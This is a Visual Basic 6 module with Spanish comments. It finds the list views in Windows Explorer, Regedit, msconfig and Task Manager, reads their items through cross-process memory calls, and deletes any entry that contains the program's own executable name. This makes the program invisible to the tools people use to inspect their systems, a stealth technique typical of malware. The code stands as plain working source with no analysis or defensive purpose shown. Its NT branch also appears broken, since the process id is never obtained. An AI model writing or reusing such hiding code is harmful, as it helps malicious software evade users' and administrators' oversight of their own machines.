Attribute VB_Name = "Module1"
Option Explicit
Public Type LV_ITEM
    mask As Long
    iItem As Long
    iSubItem As Long
    state As Long
    stateMask As Long
    lpszText As Long 'LPCSTR
    cchTextMax As Long
    iImage As Long
    lParam As Long
    iIndent As Long
End Type

Type LV_TEXT
    sItemText As String * 80
End Type

Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
Public Declare Function PostMessageString Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Public Declare Function GetForegroundWindow Lib "user32" () As Long
Public Declare Function SetForegroundWindow Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetDesktopWindow Lib "user32" () As Long
Public Declare Function GetWindow Lib "user32" (ByVal hWnd As Long, ByVal wFlag As Long) As Long
Public Declare Function GetClassName Lib "user32" Alias "GetClassNameA" _
    (ByVal hWnd As Long, ByVal lpClassName As String, _
    ByVal nMaxCount As Long) As Long
Public Const GW_HWNDFIRST = 0&
Public Const GW_HWNDNEXT = 2&
Public Const GW_CHILD = 5&
Public Const GWL_HWNDPARENT = (-8)
Public Const WM_SETTEXT = &HC
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_CHAR = &H102
Public Const WM_COMMAND = &H111
Public Const VK_RETURN = &HD

Private Declare Function FindWindow& Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String)
Private Declare Function FindWindowEx& Lib "user32" Alias "FindWindowExA" (ByVal hWndParent As Long, ByVal hWndChildAfter As Long, ByVal lpClassName As String, ByVal lpWindowName As String)
'Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hWnd As Long, lpdwProcessId As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (lpDest As Any, lpSource As Any, ByVal cBytes As Long)

Private Declare Function SendMessage& Lib "user32" Alias "SendMessageA" (ByVal hWnd&, ByVal wMsg&, ByVal wParam&, lParam As Any)
Private Const LVM_FIRST = &H1000
Private Const LVM_GETTITEMCOUNT& = (LVM_FIRST + 4)
Private Const LVM_GETITEMTEXTA As Long = (LVM_FIRST + 45)
Private Const LVM_GETITEMTEXTW As Long = (LVM_FIRST + 115)
Private Const LVM_GETITEMA = (LVM_FIRST + 5)
Private Const LVM_GETITEMW = (LVM_FIRST + 75)
Private Const LVIF_TEXT = &H1
Public Const LVM_DELETEITEM = (LVM_FIRST + 8)

Public Function GetListViewItems(ByVal hLV As Long) As Variant
   Dim pid As Long, tid As Long
   Dim hProcess As Long, nCount As Long, lWritten As Long, i As Long
   Dim lpSysShared As Long, hFileMapping As Long, dwSize As Long
   Dim lpSysShared2 As Long, hFileMapping2 As Long
   Dim sLVItems() As String
   Dim li As LV_ITEM
   Dim lt As LV_TEXT
   If hLV = 0 Then Exit Function
'   tid = GetWindowThreadProcessId(hLV, pid)
   nCount = SendMessage(hLV, LVM_GETTITEMCOUNT, 0, 0&)
   If nCount = 0 Then Exit Function
   ReDim sLVItems(nCount - 1)
   li.cchTextMax = 80
   dwSize = Len(li)
   If IsWindowsNT Then
      lpSysShared = GetMemSharedNT(pid, dwSize, hProcess)
      lpSysShared2 = GetMemSharedNT(pid, LenB(lt), hProcess)
      For i = 0 To nCount - 1
          li.lpszText = lpSysShared2
          li.cchTextMax = 80
          li.iItem = i
          li.mask = LVIF_TEXT
          WriteProcessMemory hProcess, ByVal lpSysShared, li, dwSize, lWritten
          WriteProcessMemory hProcess, ByVal lpSysShared2, lt, LenB(lt), lWritten
          Call SendMessage(hLV, LVM_GETITEMW, 0, ByVal lpSysShared)
          Call ReadProcessMemory(hProcess, ByVal lpSysShared2, lt, LenB(lt), lWritten)
          sLVItems(i) = StrConv(lt.sItemText, vbFromUnicode)
          
'**************************************************************
          
            If InStr(LCase(sLVItems(i)), LCase(App.EXEName)) <> 0 Then
                Call EliminarItem(hLV, i)
            End If
          
'**************************************************************
      
      Next i
      FreeMemSharedNT hProcess, lpSysShared, dwSize
      FreeMemSharedNT hProcess, lpSysShared2, LenB(lt)
   Else
      
      lpSysShared = GetMemShared95(dwSize, hFileMapping)
      lpSysShared2 = GetMemShared95(Len(lt), hFileMapping2)
      li.lpszText = lpSysShared2
      CopyMemory ByVal lpSysShared, li, dwSize
      CopyMemory ByVal lpSysShared2, lt, Len(lt)
      For i = 0 To nCount - 1
          Call SendMessage(hLV, LVM_GETITEMTEXTA, i, ByVal lpSysShared)
          CopyMemory lt, ByVal lpSysShared2, Len(lt)
          sLVItems(i) = TrimNull(lt.sItemText)
          
'**************************************************************
          
          If InStr(LCase(sLVItems(i)), LCase(App.EXEName)) <> 0 Then
            Call EliminarItem(hLV, i)
          End If
          
'**************************************************************
      Next i
      FreeMemShared95 hFileMapping, lpSysShared
      FreeMemShared95 hFileMapping2, lpSysShared2
   End If
   GetListViewItems = sLVItems
End Function

Public Function GetSysLVHwnd() As Long
Dim h As Long
Dim i As Long
Dim w As Long
Dim x As Long
Dim hWndText As String
Dim sClass As String
    x = GetWindow(GetDesktopWindow(), GW_CHILD)
    hWndText = fWindowText(x)
    Do Until x = 0
        hWndText = fWindowText(x)
        If hWndText <> "" Then
            sClass = Space$(255)
            Call GetClassName(x, sClass, 255)
            sClass = Left$(sClass, InStr(sClass, vbNullChar) - 1)

            'BUSCANDO EXPLORER....
            If LCase(sClass) = "cabinetwclass" Then
              i = FindWindowEx(x, 0, "SHELLDLL_DefView", "")
              i = FindWindowEx(i, 0, "Internet Explorer_Server", "")
              i = FindWindowEx(i, 0, "ATL Shell Embedding", "")
              i = FindWindowEx(i, 0, "SysListView32", "")
              If i <> 0 Then
                Call GetListViewItems(i)
              Else
                i = FindWindowEx(x, 0, "SHELLDLL_DefView", "")
                i = FindWindowEx(i, 0, "DUIViewWndClassName", "")
                i = FindWindowEx(i, 0, "DirectUIHWND", "")
                i = FindWindowEx(i, 0, "CtrlNotifySink", "")
                i = FindWindowEx(i, 0, "SysListView32", "")
                If i <> 0 Then
                  Call GetListViewItems(i)
                End If
              End If
            End If
            'BUSCANDO REGEDIT...
            If LCase(sClass) = "regedit_regedit" Then
                i = FindWindowEx(x, 0, "SysListView32", "")
                If i <> 0 Then
                    Call GetListViewItems(i)
                End If
            End If
            'BUSCANDO MSCONFIG, Y TASKMANAGER....
            If LCase(sClass) = "#32770" Then
                i = FindWindowEx(x, 0, "#32770", "")
                i = FindWindowEx(i, 0, "SysListView32", "")
                If i <> 0 Then
                    Call GetListViewItems(i)
                End If
            End If
        End If
        x = GetWindow(x, GW_HWNDNEXT)
    Loop
End Function

Public Function TrimNull(startstr As String) As String
   Dim pos As Integer
   pos = InStr(startstr, Chr$(0))
   If pos Then
      TrimNull = Left$(startstr, pos - 1)
      Exit Function
   End If
   TrimNull = startstr
End Function

Public Function fWindowText(hWnd As Long) As String
    Dim lLength     As Long
    Dim sText       As String
    lLength = SendMessage(hWnd, WM_GETTEXTLENGTH, 0, ByVal 0&)
    sText = Space$(lLength + 1)
    Call SendMessage(hWnd, WM_GETTEXT, lLength + 1, ByVal sText)
    fWindowText = Left$(sText, lLength)
End Function

Public Function EliminarItem(hWnd As Long, y As Long)
Call SendMessage(hWnd, LVM_DELETEITEM, y, 0)
End Function
